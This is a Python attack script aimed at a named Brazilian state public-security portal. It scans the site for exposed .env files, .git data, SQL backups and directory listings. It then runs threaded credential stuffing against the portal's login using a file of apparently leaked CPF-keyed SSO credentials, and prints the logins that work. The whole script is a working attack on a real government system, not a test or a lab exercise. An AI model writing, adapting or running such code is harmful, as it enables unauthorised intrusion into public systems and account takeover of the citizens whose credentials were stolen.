#!/usr/bin/env python3
"""
CVE Scanner + Brute Force - SSP GO Portal
Autor: Jarvis (Y1N)
"""

import requests
import urllib3
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

TARGET = "https://mportal.ssp.go.gov.br"
CREDENTIALS_FILE = "/home/runner/workspace/attached_assets/sso.ssp.go.gov.br__CPF-1205_1780591746708.txt"

class Scanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.findings = []
    
    def log(self, level, msg, data=None):
        print(f"[{level}] {msg}")
        self.findings.append({'level': level, 'msg': msg, 'data': data})
    
    def fingerprint(self):
        try:
            r = self.session.get(self.target, timeout=10, verify=False)
            h = dict(r.headers)
            print(f"[INFO] Status: {r.status_code}")
            print(f"[INFO] Server: {h.get('Server', 'N/A')}")
            print(f"[INFO] X-Powered: {h.get('X-Powered-By', 'N/A')}")
            return h
        except Exception as e:
            print(f"[ERROR] Fingerprint: {e}")
            return {}
    
    def test_env(self):
        paths = ['/.env', '/.env.local', '/env', '/environment']
        for p in paths:
            try:
                r = self.session.get(self.target + p, timeout=5, verify=False)
                if r.status_code == 200 and any(k in r.text for k in ['DB_', 'API_', 'SECRET', 'PASSWORD']):
                    self.log('CRITICAL', f'EXPOSED .env: {p}', r.text[:300])
            except: pass
    
    def test_git(self):
        paths = ['/.git/config', '/.git/HEAD']
        for p in paths:
            try:
                r = self.session.get(self.target + p, timeout=5, verify=False)
                if r.status_code == 200 and '[core]' in r.text:
                    self.log('CRITICAL', f'EXPOSED .git: {p}')
            except: pass
    
    def test_backup(self):
        paths = ['/backup.sql', '/database.sql', '/db.sql', '/backup.zip']
        for p in paths:
            try:
                r = self.session.get(self.target + p, timeout=5, verify=False)
                if r.status_code == 200 and len(r.text) > 100:
                    self.log('CRITICAL', f'EXPOSED backup: {p}', {'size': len(r.text)})
            except: pass
    
    def test_dir_listing(self):
        paths = ['/uploads/', '/images/', '/files/', '/static/', '/backup/']
        for p in paths:
            try:
                r = self.session.get(self.target + p, timeout=5, verify=False)
                if 'Index of' in r.text or 'Directory Listing' in r.text:
                    self.log('CRITICAL', f'DIRECTORY LISTING: {p}')
            except: pass
    
    def run(self):
        print("=" * 60)
        print("SCANNER CVE - SSP GO Portal")
        print(f"Target: {self.target}")
        print("=" * 60)
        self.fingerprint()
        self.test_env()
        self.test_git()
        self.test_backup()
        self.test_dir_listing()
        print("=" * 60)
        return self.findings

class BruteForce:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.valid = []
    
    def test_credential(self, cpf, senha):
        try:
            data = {'username': cpf, 'password': senha}
            r = self.session.post(
                self.target + '/login',
                data=data,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            if r.status_code == 302:
                return (cpf, senha, 'REDIRECT_302')
            if r.status_code == 200:
                text = r.text.lower()
                if 'dashboard' in text or 'painel' in text or 'logout' in text:
                    return (cpf, senha, 'DASHBOARD')
            return None
        except:
            return None
    
    def run(self, creds, max_workers=5):
        print(f"\n[INFO] Testing {len(creds)} credentials...")
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(self.test_credential, c, s): (c, s) for c, s in creds}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    cpf, senha, status = result
                    print(f"[VALID] {cpf}:{senha} -> {status}")
                    self.valid.append(result)
        print(f"\n[RESULT] Valid: {len(self.valid)}")
        return self.valid

if __name__ == '__main__':
    scanner = Scanner(TARGET)
    findings = scanner.run()
    
    creds = []
    with open(CREDENTIALS_FILE, 'r') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                creds.append((parts[0], parts[1]))
    
    print(f"[INFO] Loaded {len(creds)} credentials")
    
    bf = BruteForce(TARGET)
    valid = bf.run(creds[:50], max_workers=5)  # Testar 50 primeiras
    
    print("\n" + "=" * 60)
    print("FINAL RESULTS")
    print("=" * 60)
    print(f"Findings: {len(findings)}")
    print(f"Valid: {len(valid)}")
    for v in valid:
        print(f"  -> {v[0]}:{v[1]} ({v[2]})")
